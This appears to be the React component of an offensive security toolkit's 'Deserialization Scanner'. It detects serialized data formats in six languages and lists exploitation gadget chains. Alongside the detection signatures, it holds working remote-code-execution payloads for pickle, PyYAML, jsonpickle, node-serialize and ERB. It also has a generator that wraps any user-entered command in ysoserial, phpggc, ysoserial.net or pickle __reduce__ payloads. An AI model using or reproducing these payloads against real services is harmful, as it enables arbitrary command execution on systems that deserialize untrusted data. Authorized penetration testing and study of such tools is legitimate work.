import React, { useState, useMemo } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCopy, faCheck, faSearch, faBug, faCode, faSkull, faExclamationTriangle, faInfoCircle } from '@fortawesome/free-solid-svg-icons';
import type { DeserializationScannerData, DeserializationLanguage, DeserializationGadget, DeserializationSignature } from './tool-types';

type Props = {
  data: DeserializationScannerData | undefined;
  onChange: (data: DeserializationScannerData) => void;
};

// Deserialization signatures to detect
const SIGNATURES: DeserializationSignature[] = [
  // Java
  { name: 'Java ObjectInputStream', pattern: 'aced0005', language: 'java', description: 'Java serialized object magic bytes' },
  { name: 'Java Base64 Serialized', pattern: 'rO0AB', language: 'java', description: 'Base64-encoded Java serialized object' },
  { name: 'Java XML Serialization', pattern: '<java.', language: 'java', description: 'Java XMLEncoder serialization' },
  { name: 'Java Gzip Serialized', pattern: '1f8b0800', language: 'java', description: 'Gzipped Java serialized object' },

  // PHP
  { name: 'PHP Serialized Object', pattern: 'O:\\d+:"', language: 'php', description: 'PHP serialized object notation' },
  { name: 'PHP Serialized Array', pattern: 'a:\\d+:{', language: 'php', description: 'PHP serialized array' },
  { name: 'PHP Phar', pattern: '__HALT_COMPILER', language: 'php', description: 'PHP Phar archive' },
  { name: 'PHP Session', pattern: '|s:\\d+:"', language: 'php', description: 'PHP session serialization' },

  // Python
  { name: 'Python Pickle v0', pattern: '(S\'|\\(S\'', language: 'python', description: 'Python Pickle protocol 0' },
  { name: 'Python Pickle v2', pattern: '80 02', language: 'python', description: 'Python Pickle protocol 2' },
  { name: 'Python Pickle v3/4', pattern: '80 03|80 04', language: 'python', description: 'Python Pickle protocol 3/4' },
  { name: 'Python PyYAML', pattern: '!!python/', language: 'python', description: 'PyYAML unsafe load' },

  // Ruby
  { name: 'Ruby Marshal', pattern: '04 08', language: 'ruby', description: 'Ruby Marshal.dump format' },
  { name: 'Ruby YAML', pattern: '--- !ruby/', language: 'ruby', description: 'Ruby YAML unsafe load' },
  { name: 'Ruby ERB', pattern: '<%=.*%>', language: 'ruby', description: 'Ruby ERB template injection' },

  // .NET
  { name: '.NET BinaryFormatter', pattern: '00 01 00 00 00 ff ff ff ff', language: 'dotnet', description: '.NET BinaryFormatter header' },
  { name: '.NET ViewState', pattern: '/wEP', language: 'dotnet', description: 'ASP.NET ViewState (base64)' },
  { name: '.NET SOAP Formatter', pattern: '<SOAP-ENV', language: 'dotnet', description: '.NET SOAP serialization' },
  { name: '.NET DataContractSerializer', pattern: '<[^>]+xmlns:i="http://www.w3.org/2001/XMLSchema-instance"', language: 'dotnet', description: '.NET DataContractSerializer' },

  // Node.js
  { name: 'Node.js serialize', pattern: '_$$ND_FUNC$$_', language: 'nodejs', description: 'node-serialize function' },
  { name: 'Node.js cryo', pattern: '__cryo_', language: 'nodejs', description: 'cryo serialization' },
  { name: 'Node.js funcster', pattern: '__js_function', language: 'nodejs', description: 'funcster serialization' }
];

// Gadget chains for exploitation
const GADGETS: DeserializationGadget[] = [
  // Java
  { name: 'CommonsCollections1', language: 'java', library: 'commons-collections:3.1', payload: 'ysoserial CommonsCollections1', description: 'InvokerTransformer chain via LazyMap', severity: 'critical' },
  { name: 'CommonsCollections5', language: 'java', library: 'commons-collections:3.1', payload: 'ysoserial CommonsCollections5', description: 'BadAttributeValueExpException chain', severity: 'critical' },
  { name: 'CommonsCollections6', language: 'java', library: 'commons-collections:3.1', payload: 'ysoserial CommonsCollections6', description: 'HashSet/HashMap chain', severity: 'critical' },
  { name: 'CommonsCollections7', language: 'java', library: 'commons-collections:3.1', payload: 'ysoserial CommonsCollections7', description: 'Hashtable chain', severity: 'critical' },
  { name: 'CommonsBeanutils1', language: 'java', library: 'commons-beanutils:1.9.2', payload: 'ysoserial CommonsBeanutils1', description: 'BeanComparator chain', severity: 'critical' },
  { name: 'Spring1', language: 'java', library: 'spring-core:4.1.4', payload: 'ysoserial Spring1', description: 'Spring framework gadget', severity: 'critical' },
  { name: 'Spring2', language: 'java', library: 'spring-aop:4.1.4', payload: 'ysoserial Spring2', description: 'Spring AOP gadget', severity: 'critical' },
  { name: 'Hibernate1', language: 'java', library: 'hibernate-core:4.3.11', payload: 'ysoserial Hibernate1', description: 'Hibernate gadget chain', severity: 'critical' },
  { name: 'Hibernate2', language: 'java', library: 'hibernate-core:5.0.7', payload: 'ysoserial Hibernate2', description: 'Hibernate5 gadget', severity: 'critical' },
  { name: 'JBossInterceptors1', language: 'java', library: 'jboss-interceptors', payload: 'ysoserial JBossInterceptors1', description: 'JBoss interceptors', severity: 'critical' },
  { name: 'Jdk7u21', language: 'java', library: 'JDK <= 7u21', payload: 'ysoserial Jdk7u21', description: 'Native JDK gadget', severity: 'critical' },
  { name: 'URLDNS', language: 'java', library: 'JDK (any)', payload: 'ysoserial URLDNS', description: 'DNS exfil gadget (detection)', severity: 'medium' },
  { name: 'JRMPClient', language: 'java', library: 'JDK (any)', payload: 'ysoserial JRMPClient', description: 'JRMP callback gadget', severity: 'high' },
  { name: 'Groovy1', language: 'java', library: 'groovy:2.3.9', payload: 'ysoserial Groovy1', description: 'Groovy MethodClosure', severity: 'critical' },
  { name: 'Myfaces1', language: 'java', library: 'myfaces-impl:2.2.9', payload: 'ysoserial Myfaces1', description: 'MyFaces ViewState', severity: 'critical' },
  { name: 'Myfaces2', language: 'java', library: 'myfaces-impl:2.2.9', payload: 'ysoserial Myfaces2', description: 'MyFaces variant', severity: 'critical' },

  // PHP
  { name: 'Monolog RCE', language: 'php', library: 'monolog/monolog', payload: 'phpggc Monolog/RCE1', description: 'BufferHandler chain', severity: 'critical' },
  { name: 'Guzzle RCE', language: 'php', library: 'guzzlehttp/guzzle', payload: 'phpggc Guzzle/RCE1', description: 'FileCookieJar chain', severity: 'critical' },
  { name: 'Laravel RCE', language: 'php', library: 'laravel/framework', payload: 'phpggc Laravel/RCE1', description: 'PendingBroadcast chain', severity: 'critical' },
  { name: 'Symfony RCE', language: 'php', library: 'symfony/symfony', payload: 'phpggc Symfony/RCE1', description: 'FilesystemIterator chain', severity: 'critical' },
  { name: 'SwiftMailer RCE', language: 'php', library: 'swiftmailer/swiftmailer', payload: 'phpggc SwiftMailer/RCE1', description: 'WritableStream chain', severity: 'critical' },
  { name: 'Doctrine RCE', language: 'php', library: 'doctrine/orm', payload: 'phpggc Doctrine/RCE1', description: 'Doctrine gadget', severity: 'critical' },
  { name: 'WordPress RCE', language: 'php', library: 'wordpress/core', payload: 'phpggc WordPress/RCE1', description: 'PHPMailer chain', severity: 'critical' },
  { name: 'Yii RCE', language: 'php', library: 'yiisoft/yii2', payload: 'phpggc Yii/RCE1', description: 'BatchQueryResult chain', severity: 'critical' },
  { name: 'ThinkPHP RCE', language: 'php', library: 'topthink/framework', payload: 'phpggc ThinkPHP/RCE1', description: 'Model chain', severity: 'critical' },

  // Python
  { name: 'Pickle RCE', language: 'python', library: 'pickle (stdlib)', payload: "cos\nsystem\n(S'id'\ntR.", description: 'Basic __reduce__ RCE', severity: 'critical' },
  { name: 'Pickle subprocess', language: 'python', library: 'pickle (stdlib)', payload: "csubprocess\nPopen\n(S'id'\ntR.", description: 'subprocess.Popen chain', severity: 'critical' },
  { name: 'PyYAML RCE', language: 'python', library: 'PyYAML', payload: '!!python/object/apply:os.system ["id"]', description: 'YAML unsafe load', severity: 'critical' },
  { name: 'PyYAML subprocess', language: 'python', library: 'PyYAML', payload: '!!python/object/apply:subprocess.check_output [["id"]]', description: 'subprocess YAML', severity: 'critical' },
  { name: 'Jsonpickle RCE', language: 'python', library: 'jsonpickle', payload: '{"py/object": "subprocess.Popen", "args": ["id"]}', description: 'jsonpickle chain', severity: 'critical' },

  // Ruby
  { name: 'ERB RCE', language: 'ruby', library: 'erb (stdlib)', payload: '<%=`id`%>', description: 'ERB command execution', severity: 'critical' },
  { name: 'Marshal RCE', language: 'ruby', library: 'Marshal (stdlib)', payload: 'Universal Deserialisation Gadget', description: 'Delegator chain', severity: 'critical' },
  { name: 'YAML Psych RCE', language: 'ruby', library: 'psych (stdlib)', payload: '--- !ruby/object:Gem::Installer', description: 'Psych unsafe load', severity: 'critical' },
  { name: 'Rails RCE', language: 'ruby', library: 'rails', payload: '!ruby/object:ActionDispatch::Routing::RouteSet::NamedRouteCollection', description: 'Rails CVE gadget', severity: 'critical' },

  // .NET
  { name: 'TypeConfuseDelegate', language: 'dotnet', library: '.NET Framework', payload: 'ysoserial.net -g TypeConfuseDelegate', description: 'Delegate confusion', severity: 'critical' },
  { name: 'PSObject', language: 'dotnet', library: 'PowerShell', payload: 'ysoserial.net -g PSObject', description: 'PowerShell gadget', severity: 'critical' },
  { name: 'WindowsIdentity', language: 'dotnet', library: '.NET Framework', payload: 'ysoserial.net -g WindowsIdentity', description: 'Windows identity chain', severity: 'critical' },
  { name: 'TextFormattingRunProperties', language: 'dotnet', library: 'VS/WPF', payload: 'ysoserial.net -g TextFormattingRunProperties', description: 'WPF gadget', severity: 'critical' },
  { name: 'ActivitySurrogateSelector', language: 'dotnet', library: '.NET Framework 4.5', payload: 'ysoserial.net -g ActivitySurrogateSelector', description: 'WF Activity chain', severity: 'critical' },
  { name: 'ObjectDataProvider', language: 'dotnet', library: 'WPF', payload: 'ysoserial.net -g ObjectDataProvider', description: 'WPF ObjectDataProvider', severity: 'critical' },
  { name: 'DataSet', language: 'dotnet', library: '.NET Framework', payload: 'ysoserial.net -g DataSet', description: 'DataSet gadget', severity: 'critical' },

  // Node.js
  { name: 'node-serialize RCE', language: 'nodejs', library: 'node-serialize', payload: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}', description: 'IIFE RCE', severity: 'critical' },
  { name: 'serialize-javascript RCE', language: 'nodejs', library: 'serialize-javascript', payload: '{"rce":{"$$typeof":Symbol.for("react.element")}}', description: 'Prototype pollution', severity: 'high' },
  { name: 'js-yaml RCE', language: 'nodejs', library: 'js-yaml < 3.13.1', payload: '"toString": { "constructor": { "prototype": {} } }', description: 'Unsafe load', severity: 'critical' }
];

const LANGUAGE_INFO: Record<DeserializationLanguage, { label: string; color: string; tool: string }> = {
  java: { label: 'Java', color: 'bg-orange-500/20 text-orange-400', tool: 'ysoserial' },
  php: { label: 'PHP', color: 'bg-purple-500/20 text-purple-400', tool: 'phpggc' },
  python: { label: 'Python', color: 'bg-yellow-500/20 text-yellow-400', tool: 'pickle/PyYAML' },
  ruby: { label: 'Ruby', color: 'bg-red-500/20 text-red-400', tool: 'marshal' },
  dotnet: { label: '.NET', color: 'bg-blue-500/20 text-blue-400', tool: 'ysoserial.net' },
  nodejs: { label: 'Node.js', color: 'bg-green-500/20 text-green-400', tool: 'node-serialize' }
};

const SEVERITY_COLORS: Record<string, string> = {
  critical: 'bg-red-500/20 text-red-400 border-red-500/50',
  high: 'bg-orange-500/20 text-orange-400 border-orange-500/50',
  medium: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/50'
};

const DeserializationScanner: React.FC<Props> = ({ data, onChange }) => {
  const selectedLanguage = data?.selectedLanguage ?? 'all';
  const activeTab = data?.activeTab ?? 'scan';
  const customCommand = data?.customCommand ?? '';
  const scanResults = data?.scanResults;
  const [copied, setCopied] = useState<string | null>(null);
  const [scanInput, setScanInput] = useState('');

  const filteredGadgets = useMemo(() => {
    if (selectedLanguage === 'all') return GADGETS;
    return GADGETS.filter(g => g.language === selectedLanguage);
  }, [selectedLanguage]);

  const filteredSignatures = useMemo(() => {
    if (selectedLanguage === 'all') return SIGNATURES;
    return SIGNATURES.filter(s => s.language === selectedLanguage);
  }, [selectedLanguage]);

  const scanData = (input: string) => {
    const found: string[] = [];
    const matchedGadgets: DeserializationGadget[] = [];

    for (const sig of filteredSignatures) {
      try {
        const regex = new RegExp(sig.pattern, 'i');
        if (regex.test(input)) {
          found.push(sig.name);
          // Add related gadgets for the detected language
          const langGadgets = GADGETS.filter(g => g.language === sig.language);
          for (const gadget of langGadgets) {
            if (!matchedGadgets.find(m => m.name === gadget.name)) {
              matchedGadgets.push(gadget);
            }
          }
        }
      } catch {
        // Invalid regex, skip
      }
    }

    onChange({
      ...data,
      scanResults: {
        found: found.length > 0,
        signatures: found,
        gadgets: matchedGadgets
      },
      scannedAt: Date.now()
    });
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    onChange({ ...data, copiedPayload: text });
    setTimeout(() => setCopied(null), 2000);
  };

  const generatePayloadCommand = (gadget: DeserializationGadget): string => {
    const cmd = customCommand || 'id';
    switch (gadget.language) {
      case 'java':
        return `java -jar ysoserial.jar ${gadget.name} "${cmd}" | base64`;
      case 'php':
        return `./phpggc ${gadget.payload.replace('phpggc ', '')} system "${cmd}" -b`;
      case 'python':
        if (gadget.payload.includes('pickle')) {
          return `python3 -c "import pickle,base64,os; class RCE: __reduce__=lambda s:(os.system,('${cmd}',)); print(base64.b64encode(pickle.dumps(RCE())).decode())"`;
        }
        return gadget.payload.replace('id', cmd);
      case 'dotnet':
        return `ysoserial.exe ${gadget.payload.replace('ysoserial.net ', '')} -c "${cmd}" -o base64`;
      case 'nodejs':
        return gadget.payload.replace("'id'", `'${cmd}'`).replace('"id"', `"${cmd}"`);
      case 'ruby':
        return gadget.payload.replace('`id`', `\`${cmd}\``);
      default:
        return gadget.payload;
    }
  };

  return (
    <div className="flex flex-col h-full text-xs">
      <div className="flex items-center justify-between mb-2">
        <div className="text-slate-200 font-medium">
          <FontAwesomeIcon icon={faSkull} className="w-3 h-3 mr-1" />
          Deserialization Scanner
        </div>
        <select
          value={selectedLanguage}
          onChange={(e) => onChange({ ...data, selectedLanguage: e.target.value as DeserializationLanguage | 'all' })}
          className="rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
        >
          <option value="all">All Languages</option>
          {(Object.keys(LANGUAGE_INFO) as DeserializationLanguage[]).map(lang => (
            <option key={lang} value={lang}>{LANGUAGE_INFO[lang].label}</option>
          ))}
        </select>
      </div>

      <div className="text-[10px] text-slate-500 mb-2">
        Detect serialization formats and generate exploitation gadgets (50+ chains)
      </div>

      {/* Tabs */}
      <div className="flex border-b border-slate-700 mb-2">
        {(['scan', 'gadgets', 'generate'] as const).map(tab => (
          <button
            key={tab}
            onClick={() => onChange({ ...data, activeTab: tab })}
            className={`px-3 py-1.5 text-[10px] transition-colors ${
              activeTab === tab
                ? 'text-blue-400 border-b-2 border-blue-400'
                : 'text-slate-400 hover:text-slate-300'
            }`}
          >
            {tab === 'scan' && <><FontAwesomeIcon icon={faSearch} className="w-2.5 h-2.5 mr-1" />Scan</>}
            {tab === 'gadgets' && <><FontAwesomeIcon icon={faBug} className="w-2.5 h-2.5 mr-1" />Gadgets ({filteredGadgets.length})</>}
            {tab === 'generate' && <><FontAwesomeIcon icon={faCode} className="w-2.5 h-2.5 mr-1" />Generate</>}
          </button>
        ))}
      </div>

      {/* Scan Tab */}
      {activeTab === 'scan' && (
        <div className="flex-1 flex flex-col min-h-0">
          <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
            <label className="text-[10px] text-slate-500 mb-1 block">Paste data to scan for serialization markers</label>
            <textarea
              value={scanInput}
              onChange={(e) => setScanInput(e.target.value)}
              placeholder="Paste cookies, headers, POST data, base64 strings..."
              className="w-full h-24 rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700 font-mono resize-none focus:outline-none focus:border-blue-500"
            />
            <button
              onClick={() => scanData(scanInput)}
              disabled={!scanInput}
              className="mt-2 px-3 py-1 rounded bg-blue-600 text-white text-[10px] hover:bg-blue-700 disabled:opacity-50 flex items-center gap-1"
            >
              <FontAwesomeIcon icon={faSearch} className="w-2.5 h-2.5" />
              Scan for Deserialization
            </button>
          </div>

          {/* Signatures Reference */}
          <div className="flex-1 overflow-y-auto rounded border border-slate-700 bg-slate-800/30 p-2">
            <div className="text-[10px] text-slate-400 mb-2 flex items-center gap-1">
              <FontAwesomeIcon icon={faInfoCircle} className="w-2.5 h-2.5" />
              Detection Signatures ({filteredSignatures.length})
            </div>
            <div className="space-y-1">
              {filteredSignatures.map((sig, i) => (
                <div key={i} className="flex items-center justify-between p-1.5 rounded bg-slate-800/50 border border-slate-700/50">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className={`px-1.5 py-0.5 rounded text-[8px] ${LANGUAGE_INFO[sig.language].color}`}>
                        {LANGUAGE_INFO[sig.language].label}
                      </span>
                      <span className="text-slate-300 text-[10px]">{sig.name}</span>
                    </div>
                    <div className="text-[9px] text-slate-500 mt-0.5">{sig.description}</div>
                  </div>
                  <code className="text-[9px] text-amber-400 bg-slate-900 px-1.5 py-0.5 rounded font-mono">
                    {sig.pattern.length > 20 ? sig.pattern.slice(0, 20) + '...' : sig.pattern}
                  </code>
                </div>
              ))}
            </div>
          </div>

          {/* Scan Results */}
          {scanResults && (
            <div className={`mt-2 rounded border p-2 ${scanResults.found ? 'border-red-500/50 bg-red-500/10' : 'border-green-500/50 bg-green-500/10'}`}>
              <div className={`text-[10px] font-medium ${scanResults.found ? 'text-red-400' : 'text-green-400'}`}>
                {scanResults.found ? (
                  <><FontAwesomeIcon icon={faExclamationTriangle} className="w-2.5 h-2.5 mr-1" />Serialization Detected!</>
                ) : (
                  <>No serialization patterns found</>
                )}
              </div>
              {scanResults.found && (
                <div className="mt-1">
                  <div className="text-[9px] text-slate-400">Found: {scanResults.signatures.join(', ')}</div>
                  <div className="text-[9px] text-slate-500">Suggested gadgets: {scanResults.gadgets.length}</div>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* Gadgets Tab */}
      {activeTab === 'gadgets' && (
        <div className="flex-1 overflow-y-auto overflow-x-hidden min-h-0">
          <div className="space-y-1 pr-1">
            {filteredGadgets.map((gadget, i) => (
              <div
                key={i}
                className={`p-2 rounded border ${SEVERITY_COLORS[gadget.severity]} bg-slate-800/30`}
              >
                <div className="flex items-center justify-between gap-2">
                  <div className="flex items-center gap-1.5 min-w-0 flex-1">
                    <span className={`px-1 py-0.5 rounded text-[8px] flex-shrink-0 ${LANGUAGE_INFO[gadget.language].color}`}>
                      {LANGUAGE_INFO[gadget.language].label}
                    </span>
                    <span className="text-slate-200 text-[10px] font-medium truncate">{gadget.name}</span>
                  </div>
                  <span className="text-[8px] uppercase font-medium flex-shrink-0">{gadget.severity}</span>
                </div>
                <div className="text-[9px] text-slate-500 mt-1 truncate">{gadget.description}</div>
                <div className="flex items-center justify-between mt-1 gap-2">
                  <code className="text-[9px] text-cyan-400 truncate flex-1 min-w-0">{gadget.library}</code>
                  <button
                    onClick={() => copyToClipboard(gadget.payload, `gadget-${i}`)}
                    className="text-[9px] text-slate-400 hover:text-white flex items-center gap-1 flex-shrink-0"
                  >
                    <FontAwesomeIcon icon={copied === `gadget-${i}` ? faCheck : faCopy} className="w-2 h-2" />
                    {copied === `gadget-${i}` ? 'Copied!' : 'Copy'}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Generate Tab */}
      {activeTab === 'generate' && (
        <div className="flex-1 flex flex-col min-h-0">
          <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
            <label className="text-[10px] text-slate-500 mb-1 block">Command to Execute</label>
            <input
              type="text"
              value={customCommand}
              onChange={(e) => onChange({ ...data, customCommand: e.target.value })}
              placeholder="id"
              className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700 font-mono focus:outline-none focus:border-blue-500"
            />
          </div>

          <div className="text-[10px] text-slate-400 mb-2">
            Select a gadget to generate payload command:
          </div>

          <div className="flex-1 overflow-y-auto space-y-2">
            {filteredGadgets.slice(0, 15).map((gadget, i) => {
              const cmd = generatePayloadCommand(gadget);
              return (
                <div key={i} className="rounded border border-slate-700 bg-slate-800/30 p-2">
                  <div className="flex items-center justify-between mb-1">
                    <div className="flex items-center gap-2">
                      <span className={`px-1.5 py-0.5 rounded text-[8px] ${LANGUAGE_INFO[gadget.language].color}`}>
                        {LANGUAGE_INFO[gadget.language].label}
                      </span>
                      <span className="text-slate-300 text-[10px]">{gadget.name}</span>
                    </div>
                    <button
                      onClick={() => copyToClipboard(cmd, `gen-${i}`)}
                      className="px-2 py-0.5 rounded bg-slate-700 text-slate-300 text-[9px] hover:bg-slate-600 flex items-center gap-1"
                    >
                      <FontAwesomeIcon icon={copied === `gen-${i}` ? faCheck : faCopy} className="w-2 h-2" />
                      {copied === `gen-${i}` ? 'Copied!' : 'Copy'}
                    </button>
                  </div>
                  <code className="text-[9px] text-green-400 bg-slate-900 p-1.5 rounded block font-mono break-all">
                    {cmd}
                  </code>
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
};

export class DeserializationScannerTool {
  static Component = DeserializationScanner;
}
